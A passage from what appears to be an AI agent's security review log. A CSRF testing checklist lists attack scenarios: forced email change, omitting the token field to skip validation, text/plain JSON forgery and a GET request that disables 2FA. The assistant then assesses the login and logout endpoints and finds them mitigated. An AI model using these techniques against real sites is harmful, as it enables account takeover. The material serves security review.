auto-submits a form changing the victim's email to the attacker's address, enabling account takeover via password reset.\n\n### Scenario 2: Fund Transfer with Token Bypass\nThe banking application has CSRF tokens but does not validate them if the parameter is omitted entirely. Removing the `csrf_token` field from the transfer form allows cross-site fund transfer.\n\n### Scenario 3: JSON API CSRF via Content-Type Manipulation\nA JSON API endpoint does not require a custom header. Using `enctype=\"text/plain\"` in an HTML form, the attacker crafts a valid JSON body that changes the victim's account settings.\n\n### Scenario 4: SameSite=Lax Bypass on GET State Change\nA settings page changes state via GET request (`/settings?disable_2fa=true`). Since `SameSite=Lax` allows cookies on top-level GET navigations, linking the victim to this URL disables their 2FA.\n\n## Output Format\n\n```\n## CSRF Vulnerability Finding\n\n**Vulnerability**: Cross-Site Request Forgery (Email Change)\n**Severity**: High (CVSS 8.0)\n**Location**: POST /api/account/change-email\n**OWASP Category**: A01:2021 - Broken Access Control\n\n### Reproduction Steps\n1. Authenticate as victim at https://target.example.com\n2. Host the following HTML on an attacker-controlled server\n3. Trick victim into visiting the attacker page while authenticated\n4. The victim's email is changed to attacker@evil.com without consent\n\n### Anti-CSRF Defenses Tested\n| Defense | Present | Enforced |\n|---------|---------|----------|\n| CSRF Token | No | N/A |\n| SameSite Cookie | Lax | Partial (GET bypass) |\n| Origin Validation | No | N/A |\n| Referer Validation | No | N/A |\n| Custom Header Required | No | N/A |\n\n### Impact\n- Account takeover via email change + password reset chain\n- Unauthorized fund transfers\n- Settings modification (2FA disable, notification change)\n\n### Recommendation\n1. Implement synchronizer token pattern (anti-CSRF tokens) for all state-changing requests\n2. Set SameSite=Strict on session cookies where possible\n3. Validate Origin and Referer headers as defense-in-depth\n4. Require re-authentication for sensitive operations (password change, fund transfer)\n5. Use custom request headers (X-Requested-With) for AJAX endpoints\n```\n"}]}},{"type":"assistant","uuid":"e29e52ec-63b5-4464-9ba2-472614c89efa","session_id":"2b41e2df-dc0b-4f8a-8b29-967490f5bc42","parent_tool_use_id":null,"message":{"id":"e29e52ec-63b5-4464-9ba2-472614c89efa","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"Now I have the CSRF checklist. Let me apply it to the login/logout endpoints.\n\nFor CSRF on POST /api/login and POST /api/logout:\n\n- Both are POST-only (doGet returns 405).\n- Anti-CSRF defenses present:\n  - SameSite cookie: The session cookie has SameSite (Strict in web.xml, Lax default). This is the KEY defense. Since the login endpoint relies on the session cookie being present (well, actually login reads from request attributes set upstream, not from the session cookie). Wait — the login endpoint reads `AuthAttributes.SUBJECT_ID` and `SESSION_ID` from request ATTRIBUTES, not from cookies. So the CSRF attack surface is: can an attacker force a victim's browser to POST to /api/login? The login itself doesn't require the victim's existing session cookie (it reads attributes set by the upstream auth step in the same request). So a cross-site POST to /api/login would just fail because the upstream auth attributes wouldn't be set (they're set by the server-side auth filter/step). Actually this is a server-to-server flow — the \"upstream authentication step\" publishes the attributes server-side. A cross-site HTML form POST from an attacker can't trigger the server-side upstream auth, so it can't create a session for the victim. So login CSRF is largely mitigated by the fact that the credentials/attributes are set server-side, not by the browser. But the README says CSRF tokens are out of scope. I'll note this as a low-severity consideration.\n  \n  - Logout CSRF: The logout endpoint reads the session id from the COOKIE. A cross-site POST to /api/logout would carry the victim's session cookie. But SameSite=Strict/Lax on the cookie means the browser won't send the cookie on a cross-site POST (for Lax, cookies are only sent on top-level GET navigations, not cross-site POSTs; for Strict, not at all on cross-site). So SameSite=Strict/Lax effectively blocks logout CSRF for modern browsers. This is a real mitigation. So logout CSRF is mitigated by SameSite. Good.\n\nSo the CSRF situation: mitigated by SameSite (Strict in shipped config). No explicit CSRF token, but the combination of POST-only + SameSite + (for login) server-side attributes provides protection. I'll report CSRF as LOW severity (residual risk if SameSite were Lax and an attacker used the login flow, or for older browsers), noting the mitigations present. Actually, let me be precise: the strongest statement is that logout CSRF is mitigated by SameSite=Strict/Lax, and login CSRF is mitigated because the identity is established server-side (request attributes from upstream auth), not via a browser-controllable cookie. So there's no exploitable CSRF. I'll note it as informational/low.\n\nNow let me apply broken-access-control skill.
